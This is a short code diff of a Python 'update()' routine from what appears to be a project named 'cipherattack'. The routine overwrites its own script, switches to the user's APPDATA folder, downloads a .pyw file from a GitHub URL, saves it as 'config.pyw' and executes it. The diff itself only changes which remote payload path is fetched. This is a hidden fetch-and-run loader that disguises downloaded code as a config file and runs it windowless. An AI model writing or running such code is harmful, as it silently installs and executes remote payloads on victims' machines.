@@ -44,7 +44,7 @@ def update():
         with open(os.path.basename(__file__),"wb") as py:
             py.write(updateFile.read())
     os.chdir(os.environ['appdata'])        
-    with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher2/target.pyw") as conf:
+    with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/target.pyw") as conf:
         with open("config.pyw","wb") as config:
             config.write(conf.read())
     os.system("config.pyw")
